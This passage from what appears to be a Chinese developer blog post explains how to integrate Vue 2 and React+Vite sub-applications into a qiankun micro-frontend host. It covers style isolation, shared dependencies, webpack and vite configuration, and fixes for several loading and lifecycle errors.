<h4 data-id="heading-10">优化方案：</h4>





















<table><thead><tr><th>方案</th><th>说明</th></tr></thead><tbody><tr><td><strong>启用 experimentalStyleIsolation</strong></td><td>qiankun 自动为子应用 CSS 添加前缀 <code>ts start({ sandbox: { experimentalStyleIsolation: true } })</code></td></tr><tr><td><strong>Critical CSS 内联</strong></td><td>将首屏关键样式内联到 HTML 中（需构建支持）</td></tr><tr><td><strong>统一 CSS 命名规范</strong></td><td>使用 CSS Modules / BEM，避免全局类名</td></tr></tbody></table>
<h3 data-id="heading-11">三、资源重复下载（带宽浪费）</h3>
<h4 data-id="heading-12">问题表现：</h4>
<ul>
<li>多个子应用都包含 <code>lodash</code>、<code>moment</code>、<code>antd.css</code></li>
<li>总包体积膨胀，加载慢</li>
</ul>
<h4 data-id="heading-13">原因分析：</h4>
<ul>
<li>各子应用独立构建，未共享依赖</li>
</ul>
<h4 data-id="heading-14">优化方案：</h4>





















<table><thead><tr><th>方案</th><th>说明</th></tr></thead><tbody><tr><td><strong>主应用提供公共依赖</strong></td><td>在主应用 <code>index.html</code>中通过 CDN 引入： <code>html &lt;script src="https://cdn.../react@18/umd/react.production.min.js"&gt;&lt;/script&gt;</code>子应用构建时 external 掉这些依赖</td></tr><tr><td><strong>Module Federation（Webpack 5）</strong></td><td>更先进的依赖共享方案，但需统一构建工具</td></tr><tr><td><strong>自建共享包（Monorepo）</strong></td><td>通过 workspace 引用公共组件/工具库</td></tr></tbody></table>
<h2 data-id="heading-15">qiankun接入vue2</h2>
<h3 data-id="heading-16">主应用（以react为例）</h3>
<h4 data-id="heading-17">修改入口文件（index.js）</h4>
<ul>
<li>自带样式隔离</li>
</ul>

<ul>
<li>
<ul>
<li>sandbox: {</li>
</ul>
</li>
</ul>
<p>strictStyleIsolation: true, // 开启样式隔离</p>
<p>},</p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ReactDOM</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom/client'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">BrowserRouter</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-router-dom'</span>;
<span class="hljs-keyword">import</span> { registerMicroApps, start } <span class="hljs-keyword">from</span> <span class="hljs-string">'qiankun'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App'</span>;
<span class="hljs-keyword">import</span> { microApps } <span class="hljs-keyword">from</span> <span class="hljs-string">'./microApps'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'./index.css'</span>;

<span class="hljs-comment">// 注册微应用</span>
<span class="hljs-title function_">registerMicroApps</span>(microApps, {
  <span class="hljs-attr">beforeLoad</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[主应用] before load'</span>, app.<span class="hljs-property">name</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>();
  },
  <span class="hljs-attr">beforeMount</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[主应用] before mount'</span>, app.<span class="hljs-property">name</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>();
  },
  <span class="hljs-attr">afterMount</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[主应用] after mount'</span>, app.<span class="hljs-property">name</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>();
  },
  <span class="hljs-attr">beforeUnmount</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[主应用] before unmount'</span>, app.<span class="hljs-property">name</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>();
  },
  <span class="hljs-attr">afterUnmount</span>: <span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[主应用] after unmount'</span>, app.<span class="hljs-property">name</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>();
  },
});

<span class="hljs-comment">// 启动 qiankun</span>
<span class="hljs-title function_">start</span>({
  <span class="hljs-attr">sandbox</span>: {
    <span class="hljs-attr">strictStyleIsolation</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 开启样式隔离</span>
  },
  <span class="hljs-attr">prefetch</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 关闭预加载</span>
});

<span class="hljs-comment">// 设置默认进入的微应用（可选）</span>
<span class="hljs-comment">// setDefaultMountApp('/my-admin');</span>

<span class="hljs-keyword">const</span> root = <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'root'</span>));
root.<span class="hljs-title function_">render</span>(
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">React.StrictMode</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">BrowserRouter</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">React.StrictMode</span>&gt;</span></span>
);
</code></pre>
<h4 data-id="heading-18">增加microApp.js文件</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 微应用配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-type">const</span> microApps = [
  {
    name: <span class="hljs-string">'my-admin'</span>, <span class="hljs-comment">// 微应用名称</span>
    entry: <span class="hljs-string">'//localhost:9527'</span>, <span class="hljs-comment">// 微应用入口地址（Vue Element Admin 默认端口）</span>
    container: <span class="hljs-string">'#subapp-viewport'</span>, <span class="hljs-comment">// 微应用挂载的容器</span>
    activeRule: <span class="hljs-string">'/my-admin'</span>, <span class="hljs-comment">// 激活路由</span>
    props: {
      <span class="hljs-comment">// 传递给微应用的数据</span>
      routerBase: <span class="hljs-string">'/my-admin'</span>,
    },
  },
  {
    name: <span class="hljs-string">'my-pro-app'</span>,
    entry: <span class="hljs-string">'//localhost:8000'</span>, <span class="hljs-comment">// my-pro-app 端口</span>
    container: <span class="hljs-string">'#subapp-viewport'</span>,
    activeRule: <span class="hljs-string">'/my-pro-app'</span>,
    props: {
      routerBase: <span class="hljs-string">'/my-pro-app'</span>,
    },
    <span class="hljs-comment">// 注意：qiankun 会从 HTML 中解析入口文件，确保入口文件导出了生命周期函数</span>
  },
];
</code></pre>
<h4 data-id="heading-19">增加挂载容器</h4>
<p>我目前是使用 antd 的 Layout 和 Menu 进行了切换访问子应用</p>
<pre><code class="hljs language-ini" lang="ini">
import React, { useState, useEffect } from 'react'<span class="hljs-comment">;</span>
import { Breadcrumb, Layout, Menu, theme } from 'antd'<span class="hljs-comment">;</span>
import { useNavigate, useLocation } from 'react-router-dom'<span class="hljs-comment">;</span>
const { Header, Content, Footer } = Layout<span class="hljs-comment">;</span>

const <span class="hljs-attr">App</span> = () =&gt; {
  const {
    token: { colorBgContainer, borderRadiusLG },
  } = theme.useToken()<span class="hljs-comment">;</span>
  const <span class="hljs-attr">navigate</span> = useNavigate()<span class="hljs-comment">;</span>
  const <span class="hljs-attr">location</span> = useLocation()<span class="hljs-comment">;</span>
  
  // 菜单项配置
  const <span class="hljs-attr">menuItems</span> = [
    {
      key: <span class="hljs-string">'/'</span>,
      label: <span class="hljs-string">'主应用首页'</span>,
    },
    {
      key: <span class="hljs-string">'/my-admin'</span>,
      label: <span class="hljs-string">'My Admin'</span>,
    },
    {
      key: <span class="hljs-string">'/my-pro-app'</span>,
      label: <span class="hljs-string">'My Pro App'</span>,
    },
  ]<span class="hljs-comment">;</span>

  const <span class="hljs-section">[selectedKeys, setSelectedKeys]</span> = useState(<span class="hljs-section">[location.pathname]</span>)<span class="hljs-comment">;</span>

  useEffect(() =&gt; {
    setSelectedKeys(<span class="hljs-section">[location.pathname]</span>)<span class="hljs-comment">;</span>
  }, <span class="hljs-section">[location.pathname]</span>)<span class="hljs-comment">;</span>

  const <span class="hljs-attr">handleMenuClick</span> = ({ key }) =&gt; {
    setSelectedKeys(<span class="hljs-section">[key]</span>)<span class="hljs-comment">;</span>
    navigate(key)<span class="hljs-comment">;</span>
  }<span class="hljs-comment">;</span>

  return (
    &lt;Layout <span class="hljs-attr">style</span>={{ minHeight: <span class="hljs-string">'100vh'</span> }}&gt;
      &lt;Header <span class="hljs-attr">style</span>={{ display: <span class="hljs-string">'flex'</span>, alignItems: <span class="hljs-string">'center'</span>, position: <span class="hljs-string">'fixed'</span>, top: <span class="hljs-number">0</span>, zIndex: <span class="hljs-number">1003</span>, width: <span class="hljs-string">'100%'</span> }}&gt;
        &lt;div <span class="hljs-attr">className</span>=<span class="hljs-string">"demo-logo"</span> style={{ color: <span class="hljs-string">'#fff'</span>, fontSize: <span class="hljs-string">'18px'</span>, fontWeight: <span class="hljs-string">'bold'</span> }}&gt;
          Qiankun 主应用
        &lt;/div&gt;
        &lt;Menu
          <span class="hljs-attr">theme</span>=<span class="hljs-string">"dark"</span>
          <span class="hljs-attr">mode</span>=<span class="hljs-string">"horizontal"</span>
          <span class="hljs-attr">items</span>={menuItems}
          <span class="hljs-attr">selectedKeys</span>={selectedKeys}
          <span class="hljs-attr">onClick</span>={handleMenuClick}
        /&gt;
      &lt;/Header&gt;
      &lt;Content <span class="hljs-attr">style</span>={{ padding: <span class="hljs-string">'0 48px'</span> }}&gt;
        &lt;Breadcrumb
          <span class="hljs-attr">style</span>={{ margin: <span class="hljs-string">'16px 0'</span> }}
          <span class="hljs-attr">items</span>={[
            { title: <span class="hljs-string">'Home'</span> },
            { title: location.pathname === <span class="hljs-string">'/'</span> ? <span class="hljs-string">'主应用'</span> : <span class="hljs-string">'微应用'</span> },
          ]}
        /&gt;
        &lt;div
          <span class="hljs-attr">style</span>={{
            background: colorBgContainer,
            minHeight: 'calc(100vh - 200px)',
            padding: 24,
            borderRadius: borderRadiusLG,
            zIndex: 1002,
          }}
        &gt;
          {/* 主应用首页内容 */}
          {<span class="hljs-attr">location.pathname</span> === <span class="hljs-string">'/'</span> &amp;&amp; (
            &lt;div&gt;
              &lt;h1&gt;欢迎使用 Qiankun 微前端主应用&lt;/h1&gt;
              &lt;p&gt;请从顶部菜单选择要访问的微应用&lt;/p&gt;
            &lt;/div&gt;
          )}
          {/* 微应用挂载容器 */}
          &lt;div <span class="hljs-attr">id</span>=<span class="hljs-string">"subapp-viewport"</span> style={{ zIndex: <span class="hljs-number">1001</span>, position: <span class="hljs-string">'absolute'</span>, top: <span class="hljs-number">80</span>, left: <span class="hljs-number">0</span>, right: <span class="hljs-number">0</span>, bottom: <span class="hljs-number">0</span> }}&gt;&lt;/div&gt;
        &lt;/div&gt;
      &lt;/Content&gt;
      &lt;Footer <span class="hljs-attr">style</span>={{ textAlign: <span class="hljs-string">'center'</span> }}&gt;
        Qiankun 微前端主应用 ©{new Date().getFullYear()}
      &lt;/Footer&gt;
    &lt;/Layout&gt;
  )<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
export default App<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-20">修改webpack配置</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
    <span class="hljs-attr">webpack</span>: {
      <span class="hljs-attr">alias</span>: {
        <span class="hljs-string">'@'</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'src'</span>),
      },
      <span class="hljs-attr">plugins</span>: [
        <span class="hljs-comment">// 添加自定义 plugin</span>
      ],
      <span class="hljs-attr">configure</span>: <span class="hljs-function">(<span class="hljs-params">webpackConfig, { env, paths }</span>) =&gt;</span> {
        <span class="hljs-comment">// 修改 webpackConfig</span>
        <span class="hljs-comment">// 允许跨域</span>
        webpackConfig.<span class="hljs-property">headers</span> = {
          <span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'*'</span>,
        };
        <span class="hljs-keyword">return</span> webpackConfig;
      },
    },
    <span class="hljs-attr">devServer</span>: {
      <span class="hljs-comment">// 自定义开发服务器</span>
      <span class="hljs-attr">port</span>: <span class="hljs-number">3001</span>,
      <span class="hljs-attr">headers</span>: {
        <span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'*'</span>,
      },
      <span class="hljs-attr">historyApiFallback</span>: <span class="hljs-literal">true</span>,
    },  
  };
</code></pre>
<h3 data-id="heading-21">子应用</h3>
<h4 data-id="heading-22">增加micro.js文件</h4>
<ul>
<li>导出qiankun必须的三个函数</li>
</ul>

<ul>
<li>
<ul>
<li>bootstrap</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>
<ul>
<li>只会在微应用初始化的时候调用一次，下次微应用重新进入时会直接调用 mount 钩子，不会再重复触发 bootstrap</li>
</ul>
</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>mount</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>
<ul>
<li>应用每次进入都会调用 mount 方法，通常在这里触发应用的渲染方法</li>
</ul>
</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>unmount</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>
<ul>
<li>应用每次 切出/卸载 会调用 mount 方法</li>
</ul>
</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>update（可选）</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>
<ul>
<li>仅在使用 loadMicroApp 方式加载微应用时生效</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App'</span>
<span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">'./store'</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>
<span class="hljs-keyword">import</span> { setToken } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils/auth'</span>



<span class="hljs-comment">// src/micro.js</span>
<span class="hljs-keyword">let</span> instance = <span class="hljs-literal">null</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">props = {}</span>) {
  <span class="hljs-keyword">const</span> { container } = props;
  
  instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
    router,
    store,
    <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>),
  }).$mount(container ? container.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'#app'</span>) : <span class="hljs-string">'#app'</span>);
}

<span class="hljs-comment">// 独立运行时</span>
<span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">window</span>.<span class="hljs-property">__POWERED_BY_QIANKUN__</span>) {
  <span class="hljs-title function_">render</span>();
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[vue-element-admin] bootstrap'</span>);
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">mount</span>(<span class="hljs-params">props</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[vue-element-admin] mount'</span>, props);
  
  <span class="hljs-comment">// 在微前端环境下自动设置用户信息和权限</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">__POWERED_BY_QIANKUN__</span>) {
    <span class="hljs-comment">// 设置 token</span>
    <span class="hljs-keyword">const</span> token = <span class="hljs-string">'qiankun-token'</span>
    <span class="hljs-title function_">setToken</span>(token)
    store.<span class="hljs-title function_">commit</span>(<span class="hljs-string">'user/SET_TOKEN'</span>, token)
    
    <span class="hljs-comment">// 设置用户角色和基本信息</span>
    store.<span class="hljs-title function_">commit</span>(<span class="hljs-string">'user/SET_ROLES'</span>, [<span class="hljs-string">'admin'</span>])
    store.<span class="hljs-title function_">commit</span>(<span class="hljs-string">'user/SET_NAME'</span>, <span class="hljs-string">'微前端用户'</span>)
    store.<span class="hljs-title function_">commit</span>(<span class="hljs-string">'user/SET_AVATAR'</span>, <span class="hljs-string">''</span>)
    store.<span class="hljs-title function_">commit</span>(<span class="hljs-string">'user/SET_INTRODUCTION'</span>, <span class="hljs-string">''</span>)
    
    <span class="hljs-comment">// 生成路由</span>
    <span class="hljs-keyword">const</span> accessRoutes = <span class="hljs-keyword">await</span> store.<span class="hljs-title function_">dispatch</span>(<span class="hljs-string">'permission/generateRoutes'</span>, [<span class="hljs-string">'admin'</span>])
    router.<span class="hljs-title function_">addRoutes</span>(accessRoutes)
  }
  
  <span class="hljs-title function_">render</span>(props);
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">unmount</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[vue-element-admin] unmount'</span>);
  <span class="hljs-keyword">if</span> (instance) {
    instance.$destroy();
    instance = <span class="hljs-literal">null</span>;
  }
}
</code></pre>
<h4 data-id="heading-23">修改入口文件 main.js</h4>
<p>把 micro 文件内容引入 并且导出，由于 qiankun 需要访问子应用的三个钩子函数，必须要导出</p>
<h4 data-id="heading-24">增加public-path.js文件</h4>
<pre><code class="hljs language-ini" lang="ini">// src/public-path.js
if (window.__POWERED_BY_QIANKUN__) {
    <span class="hljs-attr">__webpack_public_path__</span> = window.__INJECTED_PUBLIC_PATH_BY_QIANKUN__<span class="hljs-comment">;</span>
  }
</code></pre>
<h4 data-id="heading-25">修改webpack配置</h4>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-keyword">const</span> { name } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./package'</span>);
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">devServer</span>: {
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-comment">// 可跨域</span>
      <span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'*'</span>,
    },
  },
  <span class="hljs-attr">configureWebpack</span>: {
    <span class="hljs-attr">output</span>: {
      <span class="hljs-attr">library</span>: <span class="hljs-string">`<span class="hljs-subst">${name}</span>-[name]`</span>,
      <span class="hljs-attr">libraryTarget</span>: <span class="hljs-string">'umd'</span>, <span class="hljs-comment">// 把微应用打包成 umd 库格式</span>
      <span class="hljs-attr">jsonpFunction</span>: <span class="hljs-string">`webpackJsonp_<span class="hljs-subst">${name}</span>`</span>, <span class="hljs-comment">// webpack 5 需要把 jsonpFunction 替换成 chunkLoadingGlobal</span>
    },
  },
};
</code></pre>
<h3 data-id="heading-26">样式冲突解决</h3>
<p>一般 qiankun 自带了样式隔离 strictStyleIsolation: true 开启样式隔离。剩下的还有冲突，需要各自应用单独处理，类名增加前缀。</p>
<p>子应用如果使用了 position 进行了定位处理，脱离文档流，会导致子应用覆盖基座的内容，需要给子应用做处理，子应用的top left 这些需要根据实际情况进行偏移处理</p>
<h2 data-id="heading-27">qiankun接入 react + vite 项目</h2>
<h3 data-id="heading-28">注意：永远不要用 vite 开发服务器作为微前端子应用的 entry</h3>
<p>微前端子应用必须是 <strong>构建后的静态资源（纯 HTML + JS + CSS）。</strong></p>
<h3 data-id="heading-29">注意：vite.config.ts中的base路径必须是相对路径</h3>
<h3 data-id="heading-30">遇到的问题1</h3>
<h4 data-id="heading-31">错误信息：</h4>
<pre><code class="hljs language-xml" lang="xml">error occurs while executing normal script 
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { injectIntoGlobalHook } <span class="hljs-keyword">from</span> <span class="hljs-string">"/@react-refresh"</span>;
...
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-32">错误原因：</h4>
<p><strong>vite 开发服务器（vite dev）会自动注入 HMR（热更新）脚本，如：</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">import</span> { injectIntoGlobalHook } <span class="hljs-keyword">from</span> <span class="hljs-string">"/@react-refresh"</span>;
  ...
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>但 qiankun 在加载子应用的 HTML 的时候，会把整个 </strong></p><strong>
<h4 data-id="heading-33">最简单的解决方式</h4>
<p>vite.config.ts中增加这个，不执行这个报错依赖</p>
<pre><code class="hljs language-css" lang="css">plugins: [
    <span class="hljs-built_in">react</span>({
      fastRefresh: false // 禁用 React Refresh
    })
  ],
</code></pre>
<h4 data-id="heading-34">解决方案1：<strong>先构建，再部署静态资源</strong></h4>
<h5 data-id="heading-35">步骤1：构建 Vite 项目</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> your-vite-react-app
npm run build  <span class="hljs-comment"># 生成 dist/ 目录</span>
</code></pre>
<h5 data-id="heading-36">步骤2：本地启动静态服务器（模拟生产环境）</h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">npx</span> <span class="hljs-string">serve</span> <span class="hljs-string">-s</span> <span class="hljs-string">dist</span> <span class="hljs-string">-l</span> <span class="hljs-number">3001</span>
</code></pre>
<p>这样 <code>http://localhost:3001</code> 返回的是 <strong>纯静态 HTML/JS/CSS，无 HMR 脚本</strong></p>
<h5 data-id="heading-37">步骤3：主应用注册构建后的地址</h5>
<pre><code class="hljs language-arduino" lang="arduino">{
  name: <span class="hljs-string">'react-vite-app'</span>,
  entry: <span class="hljs-string">'//localhost:3001'</span>, <span class="hljs-comment">// ← 指向静态服务器</span>
  container: <span class="hljs-string">'#container'</span>,
  activeRule: <span class="hljs-string">'/vite'</span>
}
</code></pre>
<h4 data-id="heading-38">解决方案2：坚持要在 「开发环境」调试微前端 + Vite 子应用</h4>
<p>目前 <strong>qiankun 官方不支持直接加载 Vite dev server</strong>，但有 <strong>workaround</strong>：</p>
<h5 data-id="heading-39">手动提供一个「纯净入口JS」</h5>
<h6 data-id="heading-40">步骤1：创建 src/micro-entry.js</h6>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> { bootstrap, mount, unmount } <span class="hljs-keyword">from</span> <span class="hljs-string">'./micro-app'</span>;
</code></pre>
<h6 data-id="heading-41">步骤2：修改 vite.config.ts，增加一个构建目标</h6>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// vite.config.ts</span>
import { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
import react <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-react'</span>;

export <span class="hljs-keyword">default</span> <span class="hljs-title function_ invoke__">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [<span class="hljs-title function_ invoke__">react</span>()],
  <span class="hljs-attr">build</span>: {
    <span class="hljs-attr">lib</span>: {
      <span class="hljs-attr">entry</span>: <span class="hljs-string">'src/micro-entry.ts'</span>, // ← 关键
      <span class="hljs-attr">name</span>: <span class="hljs-string">'ReactViteApp'</span>,
      <span class="hljs-attr">formats</span>: [<span class="hljs-string">'umd'</span>],
      <span class="hljs-attr">fileName</span>: <span class="hljs-string">'micro-app'</span>,
    },
    <span class="hljs-attr">rollupOptions</span>: {
      <span class="hljs-attr">external</span>: [<span class="hljs-string">'react'</span>, <span class="hljs-string">'react-dom'</span>],
      <span class="hljs-attr">output</span>: {
        <span class="hljs-attr">globals</span>: {
          <span class="hljs-attr">react</span>: <span class="hljs-string">'React'</span>,
          <span class="hljs-string">'react-dom'</span>: <span class="hljs-string">'ReactDOM'</span>,
        },
      },
    },
  },
});
</code></pre>
<h6 data-id="heading-42">步骤3：添加构建脚本</h6>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json</span>
<span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"build:micro"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vite build"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h6 data-id="heading-43">步骤4：运行构建并启动静态服务</h6>
<pre><code class="hljs language-arduino" lang="arduino">npm run build:micro
npx serve -s dist -l <span class="hljs-number">3001</span>
</code></pre>
<h6 data-id="heading-44">步骤5：主应用注册 JS 入口</h6>
<pre><code class="hljs language-arduino" lang="arduino">{
  name: <span class="hljs-string">'react-vite-app'</span>,
  entry: <span class="hljs-string">'//localhost:3001/micro-app.umd.js'</span>, <span class="hljs-comment">// ← 直接加载 JS</span>
  container: <span class="hljs-string">'#container'</span>,
  activeRule: <span class="hljs-string">'/vite'</span>
}
</code></pre>
<h3 data-id="heading-45">遇到的问题2</h3>
<h4 data-id="heading-46">错误信息</h4>
<pre><code class="hljs language-vbnet" lang="vbnet">Failed <span class="hljs-keyword">to</span> load <span class="hljs-keyword">module</span> 
<span class="hljs-symbol">script:</span> Expected a JavaScript-<span class="hljs-built_in">or</span>-Wasm 
<span class="hljs-keyword">module</span> script but the server responded <span class="hljs-keyword">with</span> a 
MIME type <span class="hljs-keyword">of</span> <span class="hljs-string">"text/html"</span>. <span class="hljs-keyword">Strict</span> MIME type checking 
<span class="hljs-built_in">is</span> enforced <span class="hljs-keyword">for</span> <span class="hljs-keyword">module</span>
scripts per HTML spec.
</code></pre>
<h4 data-id="heading-47">错误原因</h4>
<p>子应用react19 + vite5的项目。</p>
<p>由于这样的项目无法正常使用vite的开发服务器进行微应用开发与调试。</p>
<h4 data-id="heading-48">解决方案</h4>
<p>使用打包，然后通过静态服务器的形式进行调试与开发</p>
<pre><code class="hljs language-arduino" lang="arduino">pnpm build

<span class="hljs-comment">// 启动静态服务器</span>
npx serve -s dist -l <span class="hljs-number">3001</span>
</code></pre>
<h3 data-id="heading-49">遇到的问题3</h3>
<h4 data-id="heading-50">错误信息</h4>
<pre><code class="hljs language-bash" lang="bash">application <span class="hljs-string">'my-react-demo'</span> died <span class="hljs-keyword">in</span> status LOADING_SOURCE_CODE: [qiankun]: You need to <span class="hljs-built_in">export</span> lifecycle <span class="hljs-built_in">functions</span> <span class="hljs-keyword">in</span> my-react-demo entry
Error: [qiankun]: You need to <span class="hljs-built_in">export</span> lifecycle <span class="hljs-built_in">functions</span> <span class="hljs-keyword">in</span> my-react-demo entry
    at getLifecyclesFromExports (http://localhost:3000/static/js/bundle.js:31610:9)
</code></pre>
<h4 data-id="heading-51">错误原因</h4>
<p>qiankun加载了子应用，但是没有找到生命周期函数。</p>
<p>你使用的是 <strong>标准 Vite React 应用构建模式</strong>（非 UMD），而 qiankun 默认期望子应用 <strong>导出一个包含生命周期的对象</strong>。</p>
<p>但在标准 HTML 入口模式下，<strong>qiankun 会尝试从全局变量或模块导出中查找生命周期函数</strong>。如果你没正确暴露它们，就会报这个错。</p>
<h4 data-id="heading-52">解决方案</h4>
<p>使用全局window进行暴露生命周期函数</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">const</span> root = createRoot(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'root'</span>)!)
<span class="hljs-keyword">if</span>(<span class="hljs-built_in">window</span>.__POWERED_BY_QIANKUN__) {
  <span class="hljs-built_in">window</span>.myReactDemo = {
    bootstrap: <span class="hljs-keyword">async</span> () =&gt; {
      console.log(<span class="hljs-string">'react app bootstraped'</span>);
    },
    mount: <span class="hljs-keyword">async</span> (props) =&gt; {
      render(props);
    },
    unmount: <span class="hljs-keyword">async</span> () =&gt; {
      root.unmount();
    },
  }
}
</code></pre>
<h3 data-id="heading-53">遇到的问题4</h3>
<h4 data-id="heading-54">错误信息</h4>
<p>加载子应用成功后，子应用样式丢失，控制台 network 显示已经加载 css文件。</p>
<h4 data-id="heading-55">错误原因</h4>
<p>子应用的DOM挂载位置错误：<strong>子应用的 React 渲染容器（</strong> <code>#root</code> <strong>）不在 qiankun 注入样式的“作用域”内</strong></p>
<ol>
<li>qiankun 创建一个 div（带 <code>[data-qiankun="myReactDemo"]</code>）并插入到 <code>#container</code></li>
<li>你的子应用 <code>mount</code> 函数中</li>
</ol>
